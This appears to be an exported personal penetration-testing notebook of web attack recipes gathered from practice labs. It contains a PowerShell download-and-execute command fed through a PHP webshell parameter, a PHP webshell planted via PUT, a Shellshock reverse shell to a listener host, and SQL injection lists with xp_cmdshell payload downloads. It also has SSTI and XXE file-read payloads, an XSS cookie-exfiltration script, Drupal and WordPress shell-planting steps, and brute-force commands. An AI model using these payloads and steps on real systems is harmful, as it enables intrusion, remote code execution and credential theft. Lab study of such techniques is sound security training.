href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec"> -exec</a><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec%20bypass"> bypass</a><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec%20bypass%20%22iex(new-object%20net.webclient).downloadstring(%27http://10.10.14.60:8000/ye3233.ps1%27)%22"> &quot;iex(new-object%20net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)</a>&quot;<br /> <br /> <br /> <br /> <br /> &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br /><br />log.php<br />hotdog!<br />&amp;YeetCannon=whoami</div><div class='page'><h1 class='title level-3'>Misconfigurations</h1><br/></div><div class='page'><h1 class='title level-4'>Insecure Directory Object Reference</h1><br/><a href=""><img src="images/1590-1.png" alt="images/1590-1.png" /></a></div><div class='page'><h1 class='title level-4'>Forced Browsing</h1><br/><a href=""><img src="images/1592-1.png" alt="images/1592-1.png" /></a><br /><a href=""><img src="images/1592-2.png" alt="images/1592-2.png" /></a></div><div class='page'><h1 class='title level-4'>API Bypass</h1><br/><a href=""><img src="images/1593-1.png" alt="images/1593-1.png" /></a></div><div class='page'><h1 class='title level-3'>PUT</h1><br/>If you can put a file in a dir crack open BURP!<br /><br />PUT /ExampleDirThatICanPutTo/myfile.php<br />^firstline<br /><br />in the load section put the php pentestmonkey script<br /><br />start nc listener<br />http://192.168.11.250/ExampleDirThatICanPutTo/myfile.php<br /><br /><br /><br />_---------------------------------------------______________________--------------VVVThis is For a webshellVVV<br />PUT /ExampleDirThatICanPutTo/myfile.php<br />^firstline<br /><br />&lt;?php<br />Echo exec($_GET[cmd]);<br />?&gt;<br />^In the load section<br /><br /><br />http://192.168.11.250/ExampleDirThatICanPutTo/myfile.php?cmd=whoami</div><div class='page'><h1 class='title level-3'>Shellshock</h1><br/>SHELLSHOCK<br />send a get request for 10.10.10.7:10000 to burp repeater<br />set useragent- <br />User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    go<br />in terminal<br />    enjoy your root shell!!<br />    <br />    <br />    <br />For testing<br />User-Agent: () { :; }; echo; echo &quot;yeet&quot;</div><div class='page'><h1 class='title level-3'>SSTI</h1><br/>Server Side Template Injection.<br />Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.<br /><a href=""><img src="images/1583-1.png" alt="images/1583-1.png" /></a><br />This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.<br />Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection</a><br /><br />Test for SSTI:<br />	{{2+2}}<br />Try to read a file:<br />	{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]()(&#39;/etc/passwd&#39;).read()}}<br />Try to execute code:<br />	{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;id&#39;).read()}}<br />	<br />	<br />There is a tool for programatically exploiting this vulnerability called tplmap. <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br />Syntax:<br />	./tplmap.py -u <a href="http://10.10.10.10:5000/">http://10.10.10.10:5000/</a> -d &#39;noot&#39; --os-cmd &quot;cat /etc/passwd&quot;</div><div class='page'><h1 class='title level-3'>SSRF</h1><br/><a href=""><img src="images/1588-1.png" alt="images/1588-1.png" /></a><br />In this example, you are expected to put in a URL and the wesite will say if the site is up. If you test localhost:3306, you are trying to hit a MySQL DB behing the wesites firewall.<br /><br /><br /><br />Possible Bypasses<br /><a href="http://127.0.0.1:3306">http://127.0.0.1:3306</a><br />http://localhost:3306<br />http://0.0.0.0:3306<br /><a href="http://[::]:3306">http://[::]:3306</a><br /><a href="http://:::3306">http://:::3306</a><br />Convert to Decimal: <a href="https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72">https://gist.github.com/mzfr/fd9959bea8e7965d851871d09374bb72</a><br /><a href=""><img src="images/1588-2.png" alt="images/1588-2.png" /></a><br />http://2130706433:3306<br /><br /><br />Things To Try<br />file:///etc/passwd<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#file</a><br /><br /><br />Enumerate external ports:<br /><div class="codebox"><div class="codebox">for&nbsp;x&nbsp;in&nbsp;{1..65535};<br />&nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;cmd=$(curl&nbsp;-so&nbsp;/dev/null&nbsp;http://10.10.146.104:8000/attack?url=http://2130706433:${x}&nbsp;-w&nbsp;&#39;%{size_download}&#39;);<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;$cmd&nbsp;!=&nbsp;1045&nbsp;];&nbsp;then<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Open&nbsp;port:&nbsp;$x&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;fi<br />done</div></div></div><div class='page'><h1 class='title level-3'>SQL Injection</h1><br/><code>admin&#39; --<br />admin&#39; #</code><br /><code>admin&#39;/*</code><br /><code>&#39; or 1=1--</code><br />user@domain&#39;--<br /><code>&#39; or 1=1#</code><br /><code>&#39; or 1=1/*</code><br /><code>&#39;) or &#39;1&#39;=&#39;1--</code><br /><code>&#39;) or (&#39;1&#39;=&#39;1--</code><br /><a href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a><br /><br /><br />username=&#39; or &#39;1&#39;=&#39;1<br />password=&#39; or &#39;1&#39;=&#39;1<br /><br /><a href="https://blog.yekki.co.uk/sql-injection/">https://blog.yekki.co.uk/sql-injection/</a> &lt;&lt;&lt;&lt;<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a><br /><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a><br /><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a><br /><br /><br /><br /><br /><br /><br /><br /><br />a&#39; union select user_name(),NULL;--<br />a&#39; union select @@version,NULL;--<br />a&#39; union select user_name(),NULL;--<br />a&#39; union SELECT name,NULL FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘users’);--<br />a&#39; union select name,NULL from master..syslogins where sysadmin = &#39;1&#39;;--<br />a&#39; union select name,NULL from master..syslogins; exec xp_cmdshell &quot;powershell iex (new-object net.webclient).downloadstring(&#39;http://192.168.119.167/443.ps1&#39;)&quot;-- </div><div class='page'><h1 class='title level-4'>sqlmap</h1><br/>sqlmap -u <a href="http://10.10.10.161">http://10.10.10.161</a> --crawl=1<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --dbs --dump<br /><br />sqlmap -u “http://192.168.11.135/?nid=2” --risk=3 --level=5 --os-shell -D DATABASENAME<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --threads=4 --dbs --tables --batch                          --forms<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --threads=4 --dbs  --batch -T users --dump<br /><br /><br />catch POST to login page (or whatever) with burp<br />send to repeater, and copy the text out (by highlighting it)<br />put that text into a .txt file (post.txt)<br />sqlmap -r post.txt -p uname              (uname must be changed out with the sql-injectable element)<br /><br /><br /><br />sqlmap -r artist.txt -p artist<br />sqlmap -r artist.txt -p artist --risk=3 --level=5 --dbs --dump<br />sqlmap -r artist3.txt -p artist --risk=3 --level=5 --dbs --dump --os-shell -D music<br /></div><div class='page'><h1 class='title level-4'>mssql (Union Examples)</h1><br/>a&#39; union select name,NULL from syscolumns where id=(select id from sysobjects where name=&#39;users&#39;);--<br /><a href=""><img src="images/1598-1.png" alt="images/1598-1.png" /></a><br /><br />a&#39; union select name,id from users;--<br /><a href=""><img src="images/1598-2.png" alt="images/1598-2.png" /></a><br /><br />a&#39; union select pass,id from users;--<br /><a href=""><img src="images/1598-3.png" alt="images/1598-3.png" /></a><br /><br />a&#39; union select name,NULL from master..syslogins; exec xp_cmdshell &quot;powershell iex (new-object net.webclient).downloadstring(&#39;http://192.168.119.167/443.ps1&#39;)&quot;-- <br /><a href=""><img src="images/1598-4.png" alt="images/1598-4.png" /></a><br /><br /><br />a&#39; union select @@version,NULL;--<br />a&#39; union select user_name(),NULL;--<br />a&#39; union select name,NULL from master..syslogins where sysadmin = &#39;1&#39;;--<br />a&#39; union SELECT name,NULL FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘users’);--<br />a&#39; union select name,NULL from master..syslogins; exec xp_cmdshell &quot;powershell iex (new-object net.webclient).downloadstring(&#39;http://192.168.119.167/443.ps1&#39;)&quot;-- <br /><br /><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a><br /><br /></div><div class='page'><h1 class='title level-4'>oracle (Union)</h1><br/><a href="https://blog.yekki.co.uk/sql-injection/">https://blog.yekki.co.uk/sql-injection/</a><br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md</a><br /><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a><br /><br />a&#39; UNION SELECT banner, NULL, NULL FROM v$version--<br />a&#39; UNION SELECT DISTINCT owner, NULL, NULL FROM all_tables--<br />a&#39; UNION SELECT table_name, NULL, NULL FROM all_tables--<br />a&#39; UNION SELECT owner, table_name, NULL FROM all_tab_columns WHERE column_name LIKE &#39;%PASS%&#39;--<br />a&#39; UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name = ‘WEB_ADMINS’--<br />a&#39; UNION SELECT PASSWORD,NULL,NULL FROM WEB_USERS--</div><div class='page'><h1 class='title level-5'>Pictures</h1><br/>a&#39; UNION SELECT banner, NULL, NULL FROM v$version--<br /><a href=""><img src="images/1600-1.png" alt="images/1600-1.png" /></a><br /><br />a&#39; UNION SELECT DISTINCT owner, NULL, NULL FROM all_tables--<br /><a href=""><img src="images/1600-2.png" alt="images/1600-2.png" /></a><br /><br />a&#39; UNION SELECT owner, table_name, NULL FROM all_tab_columns WHERE column_name LIKE &#39;%PASS%&#39;--<br /><a href=""><img src="images/1600-3.png" alt="images/1600-3.png" /></a><br /><br />a&#39; UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = &#39;WEB_ADMINS&#39;--<br /><a href=""><img src="images/1600-4.png" alt="images/1600-4.png" /></a><br /><br />a&#39; UNION SELECT ADMIN_NAME,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1600-5.png" alt="images/1600-5.png" /></a><br /><br />a&#39; UNION SELECT PASSWORD,NULL,NULL FROM WEB_ADMINS--<br /><a href=""><img src="images/1600-6.png" alt="images/1600-6.png" /></a><br /><br />crackstation.net<br /><a href=""><img src="images/1600-7.png" alt="images/1600-7.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>login checklist</h1><br/>or 1=1<br />or 1=1--<br />or 1=1#<br />or 1=1/*<br />‘or 1 or’<br />&#39; or 1=1;-- - <br />admin&#39; --<br />admin&#39; #<br />admin&#39;/*<br />admin&#39; or &#39;1&#39;=&#39;1<br />admin&#39; or &#39;1&#39;=&#39;1&#39;--<br />admin&#39; or &#39;1&#39;=&#39;1&#39;#<br />admin&#39; or &#39;1&#39;=&#39;1&#39;/*<br />admin&#39;or 1=1 or &#39;&#39;=&#39;<br />admin&#39; or 1=1<br />admin&#39; or 1=1--<br />admin&#39; or 1=1#<br />admin&#39; or 1=1/*<br />admin&#39;) or (&#39;1&#39;=&#39;1<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;--<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;#<br />admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*<br />admin&#39;) or &#39;1&#39;=&#39;1<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;--<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;#<br />admin&#39;) or &#39;1&#39;=&#39;1&#39;/*<br />1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055<br />admin&quot; --<br />admin&quot; #<br />admin&quot;/*<br />admin&quot; or &quot;1&quot;=&quot;1<br />admin&quot; or &quot;1&quot;=&quot;1&quot;--<br />admin&quot; or &quot;1&quot;=&quot;1&quot;#<br />admin&quot; or &quot;1&quot;=&quot;1&quot;/*<br />admin&quot;or 1=1 or &quot;&quot;=&quot;<br />admin&quot; or 1=1<br />admin&quot; or 1=1--<br />admin&quot; or 1=1#<br />admin&quot; or 1=1/*<br />admin&quot;) or (&quot;1&quot;=&quot;1<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;--<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;#<br />admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*<br />admin&quot;) or &quot;1&quot;=&quot;1<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;--<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;#<br />admin&quot;) or &quot;1&quot;=&quot;1&quot;/*<br />1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055</div><div class='page'><h1 class='title level-3'>Upload Vulnerablities</h1><br/>Evading filters is often the challenging aspect of upload vulnerablitites. The following are the most common filters.<br />	-Client Side<br />		Bypass: <br />			Intercept with burp (refresh with ctrl+F5 to not use cache)(be sure to not ignore .js files) and edit the js filter. Then turn off intercept.<br />			Try upload something legit, catching the POST request with burp, then replace the legit thing with your code.				<br />	-Server Side<br />		File Extensions:<br />			Determine it if is a white or blacklist by uploading yeet.notarealextension. If that is blocked, you&#39;ll know it is a whitelist.<br />			php extensions:<br />				.php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phar<br />		Magic Byte:<br />			Upload a legit thing, but change the magic byte (using hexeditor) to see if that is being filtered.<br />			<a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a><br />		MIME Type:<br />			Catch legit thing with burp and change the MIME type (text/x-php) to see if it is being filtered.<br />		File Length<br />			Try progressivley larger/smaller files to determine the limits.<br />			<br />			<br />			<br />			<br />			<br />			<br />			<br />			<br /></div><div class='page'><h1 class='title level-3'>UUFU</h1><br/>***These are notes on how to perform an upload from an Unauthenticated Unrestricted File Upload exploit***<br />Copy example code from below and paste to new file yeet.html<br /><br />&lt;html&gt;<br />&lt;body&gt;<br />&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />        &lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;<br />        &lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;<br />&lt;/form&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /><br />Edit localhost to represent target Ip<br />In firefox browser<br />    file:///root/Desktop/Machines/VulnHub/HF2019/Sedna/yeet.html<br />  <br />This will bring up a page that will allow you to upload a file (optimally a php shellcode)<br />    browse&gt; to cannon.php &gt; send<br />    <br />In this exploit (40390) you go to 192.168.11.250/files/ and click on cannon.php to execute your shellcode. This will differ by exploit</div><div class='page'><h1 class='title level-3'>XSS</h1><br/><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads</a><br /><br />&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;<br />&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt; <br />&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;<br />&lt;script&gt;window.location=&#39;http://10.10.192.39/log/&#39;+document.cookie&lt;/script&gt;</div><div class='page'><h1 class='title level-4'>Reflected</h1><br/>In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.<br />This might seem harmless as it requires the victim to send a request containing an attackers payload, and a user wouldn&#39;t attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email..<br />Reflected XSS is the most common type of XSS attack.<br /><br />&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;<br />#Will return the ip of the webserver (.pathname could also be useful)</div><div class='page'><h1 class='title level-4'>Stored</h1><br/>Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the &quot;bad parts&quot; of a users input) when inserted into the database.  <br /><br />An example<br />	A attacker creates a payload in a field when signing up to a website that is stored in the websites database. If the website doesn&#39;t properly sanitise that field, when the site displays that field on the page, it will execute the payload to everyone who visits it.<br />	The payload could be as simple as &lt;script&gt;alert(1)&lt;/script&gt;<br />	However, this payload wont just execute in your browser but any other browsers that display the malicious data inserted into the database.<br /><br /><br />&lt;i&gt;test&lt;/i&gt;	<br />#If your text is italisized you are injecting code via html tagging.<br />&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br />&lt;script&gt;document.getElementById(&#39;thm-title&#39;).innerHTML=&quot;test&quot;;&lt;/script&gt;<br />#Same thing<br />&lt;script&gt;window.location=&#39;http://10.10.192.39/log/&#39;+document.cookie&lt;/script&gt;<br />#This will send the cookie of whoever loads the page to <a href="http://10.10.192.39/log/.">http://10.10.192.39/log/.</a> I could not make this call my webserver.<br /></div><div class='page'><h1 class='title level-4'>DOM-Based</h1><br/>DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.</div><div class='page'><h1 class='title level-3'>XXE</h1><br/>XML External Entity<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe</a><br /><div class="codebox"><div class="codebox">&lt;!DOCTYPE&nbsp;replace&nbsp;[&lt;!ENTITY&nbsp;name&nbsp;&quot;feast&quot;&gt;&nbsp;]&gt;<br />&lt;userInfo&gt;<br />	&lt;firstName&gt;falcon&lt;/firstName&gt;<br />	&lt;lastName&gt;&amp;name;&lt;/lastName&gt;<br />&lt;/userInfo&gt;<br />&lt;!--&nbsp;In&nbsp;the&nbsp;above,&nbsp;$name;&nbsp;is&nbsp;a&nbsp;variable&nbsp;for&nbsp;&quot;feast&quot;&nbsp;--&gt;</div></div><br /><div class="codebox"><div class="codebox">&lt;?xml&nbsp;version=&quot;1.0&quot;?&gt;<br />&lt;!DOCTYPE&nbsp;root&nbsp;[&lt;!ENTITY&nbsp;read&nbsp;SYSTEM&nbsp;&#39;file:///etc/passwd&#39;&gt;]&gt;<br />&lt;root&gt;&amp;read;&lt;/root&gt;<br /><br />&lt;!--&nbsp;&amp;read;&nbsp;is&nbsp;a&nbsp;variable&nbsp;that&nbsp;will&nbsp;attempt&nbsp;to&nbsp;read&nbsp;from&nbsp;the&nbsp;etc&nbsp;passwd&nbsp;file&nbsp;--&gt;<br />&lt;!--&nbsp;url&nbsp;encode&nbsp;this,&nbsp;and&nbsp;put&nbsp;it&nbsp;in&nbsp;as&nbsp;a&nbsp;data&nbsp;entry&nbsp;field&nbsp;--&gt;</div></div><br /><br /><a href=""><img src="images/1567-1.png" alt="images/1567-1.png" /></a>  <a href=""><img src="images/1567-2.png" alt="images/1567-2.png" /></a><br /><a href=""><img src="images/1567-3.png" alt="images/1567-3.png" /></a><br /><a href=""><img src="images/1567-4.png" alt="images/1567-4.png" /></a><br />For RCE replace file with expect. Not super common but worth a shot.<br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe</a></div><div class='page'><h1 class='title level-4'>XXE Example</h1><br/><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability</a><br />^Payload all the things has THE list of xxe payloads<br /><br />I am restricted to only calling Author, Subject, and Content<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;Yeet&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt; <br /><br /><br />So I try the classic oneliner and set the variable &amp;test; to print out /etc/passwd<br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;<br /><br />the whole script looks like this<br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;&amp;test;&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt;    <br /><br /><br />success! we called &amp;test; with subject and it printed out the outcome of the variable<br /></div><div class='page'><h1 class='title level-2'>WebApps</h1><br/></div><div class='page'><h1 class='title level-3'>Drupal</h1><br/>drupwn enum <a href="http://192.168.11.137">http://192.168.11.137</a><br /><br />look for drush one on the box. You can change password with <br /><code>drush user-password USERNAME --password=&quot;SOMEPASSWORD&quot;</code>               in drupal 8 and below<br /><code>drush user:password USERNAME &quot;SOMEPASSWORD&quot;</code>                                   in drupal 9<br />^^^^^must be run from /var/www/html and you must provide a real username (admin)<br /><br /><br />went to extensions and added the drupal php module (version dose not matter) Made sure to enable it and check configs. (<a href="https://www.drupal.org/project/php/releases/8.x-1.0">https://www.drupal.org/project/php/releases/8.x-1.0</a>  &lt;&lt;&lt;url for php extension)<br />I then went to content&gt;add content&gt;basic page. set text format to “PHP code” and dropped in code from pentestmonkey (<a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a>)<br />opened a nc listener<br />hit save and the code executed!<br /><br /><br />IPPSEC admin code execuiton<br />login&gt;Modules&gt;php filter(on)&gt;save configuration&gt;content&gt;add content&gt; article&gt; add a title&gt;    &lt;?php system(&quot;whoami&quot;) ?&gt;     &gt; text format=PHP code &gt; preview</div><div class='page'><h1 class='title level-4'>drupwn output</h1><br/><br />     / __ \_______  ______ _      ______<br />      / / / / ___/ / / / __ \ | /| / / __ \<br />     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /<br />    /_____/_/   \__,_/ .___/|__/|__/_/ /_/<br />                     /_/<br />    <br />[-] Version not specified, trying to identify it<br /><br />[+] Version detected: 7.0<br /><br />Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]<br />                                                                                    <br />Drupwn&gt; list                                                                        <br />+---------------+----------------------------------------+---------------------------------+<br />|      CVE      |              Description               |        Versions affected        |<br />+---------------+----------------------------------------+---------------------------------+<br />| CVE-2018-7602 | Authenticated Remote Command Execution |           7.x &lt;= 7.58           |<br />| CVE-2019-6340 |        Remote Command Execution        | 8.5.x &lt; 8.5.11 &amp; 8.6.x &lt; 8.6.10 |<br />| CVE-2018-7600 |        Remote Command Execution        |      7.x &lt; 7.58 &amp; 8.x &lt; 8.1     |<br />+---------------+----------------------------------------+---------------------------------+<br />                                                                                    <br />Drupwn&gt;<br /><br />                                                                                   <br />Drupwn&gt; exploit CVE-2018-7600                                                       <br /><br />[+] Exploit completed. Webshell accessible at: <a href="http://192.168.11.137/497PAZ.php?c=CMD">http://192.168.11.137/497PAZ.php?c=CMD</a></div><div class='page'><h1 class='title level-4'>drupal 8</h1><br/></div><div class='page'><h1 class='title level-4'>drupal 7</h1><br/>from there I was able to log into the website and make a php file!<br />login&gt;content&gt;edit&gt;webform&gt;formsettings&gt;<br />paste php script form pentestmonkey !!!AND BE SURE TO PUT SOME REAL TEXT OUTSIDE OF THE PHP CODE OR IT WILL NOT BE RUN!!!!<br />set text format to phpcode&gt; save<br /><br />now lets execute<br />start listener<br />logout&gt;contact us&gt;bullshit&gt;submit<br />enjoy your shell!!</div><div class='page'><h1 class='title level-3'>Joomlah!</h1><br/>ruby joomlavs.rb -u <a href="http://192.168.11.128">http://192.168.11.128</a> --scan-all<br /><br />python joomblah.py <a href="http://192.168.11.128/">http://192.168.11.128/</a><br /><br />perl joomscan.pl -u 192.168.11.128<br /><br /></div><div class='page'><h1 class='title level-3'>Magento</h1><br/><a href="https://github.com/steverobbins/magescan.git">https://github.com/steverobbins/magescan.git</a><br /><br /><br />VVRun from magescan Dir (/root/Desktop/tools/magescan)VV<br />php magescan.phar scan:all http://huggermuggers.com</div><div class='page'><h1 class='title level-4'>Manual Check</h1><br/>huggermugger.com/<strong>sitemap.xml</strong><br /><br /></div><div class='page'><h1 class='title level-3'>NoSQL/MongoDB</h1><br/>Nosql-MongoDB-injection-username-password-enumeration/<br />    python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login,submit:submit<br />    python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login,submit:submit<br /></div><div class='page'><h1 class='title level-3'>sharepoint</h1><br/>from homepage url (http://tally/_layouts/15/start.aspx)<br />go to http://tally/_layouts/15/viewlsts.aspx</div><div class='page'><h1 class='title level-3'>WordPress</h1><br/>logging into wordpress as an admin alows you to edit plugins<br />find one that is running php and throw in your long php reverseshell shellcode<br />start nc listener<br />save the file and activate the plugin <br />you should now have a shell!!<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />/var/www/wordpress/wp-config.php         may show my sql creds<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br />wpscan --url <a href="http://10.10.10.37">http://10.10.10.37</a> --enumerate u,ap,tt,t -o /root/Desktop/Machines/HTB/Blocky/BlockyWpscan.txt<br /><br />wpscan --url <a href="http://dc-2/">http://wordy/</a> --enumerate u,ap,tt,t --ignore-main-redirect -o /root/Desktop/Machines/VulnHub/DC-6/WPScan.txt<br /><br />wpscan --url <a href="http://dc-2">http://dc-2</a> --passwords cewlwords.txt -e<br /><br />wpscan --url <a href="http://dc-2">http://dc-2</a>/wp-login --passwords cewlwords.txt --usernames jerry<br /><br />wpscan --url <a href="http://wordy">http://wordy</a> --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e | tee WPScanBruteForce.txt<br /><br />wpscan --url <a href="http://10.10.10.37">http://</a>wordy --enumerate u,ap,tt,t --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e <br />^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^<br />if above fails try against cewl<br />WORDPRESS SHOWS PLUGINS ON THE LEFT PANE OF THE SCREEN<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br />make sure to try usernames with keyboard slam passwords. WP may show you if the username is legit!<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br />When I edited the php files to add my shellcode, it would disappear so I had to come up with a new plan...<br />Plugins&gt;add new&gt;search plugins&gt;wp filemanager&gt;install now&gt; make sure it is activated and stuff...<br />now WP File Manager should be on the left pane.<br />navigate in the directory to wp-content&gt;uploads&gt; right click in pane&gt;upload files&gt;locate your php file and upload!<br />start your nc listener<br />&gt;right click on your upload&gt;get info and share&gt;ctrl click on the link&gt; enjoy your shell!!!<br /><br /><br /><br />hydra -l wade -P ./fsocity.dic 10.10.163.14 -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</div><div class='page'><h1 class='title level-1'>PrivEsc</h1><br/></div><div class='page'><h1 class='title level-2'>AD</h1><br/></div><div class='page'><h1 class='title level-3'>Introduction</h1><br/></div><div class='page'><h1 class='title level-4'>Course Goals</h1><br/>Improve understanding of how domained Windows environments function and the common ways that it is abused.</div><div class='page'><h1 class='title level-4'>Environment and Setup</h1><br/>-Windows machines plus a kali.<br />    -Windows Server 2016 DC<br />    -Windows Server 2016 IIS<br />    -Windows 10<br />    -Windows 7<br />    -Kali<br /><br />Be sure that all machines are on the same network, pingable and that the windows machines are on the domain.<br /><br />Windows defender, firewall, and real time protection are on and updated as of 7/1/2020.<br />IIS server is running 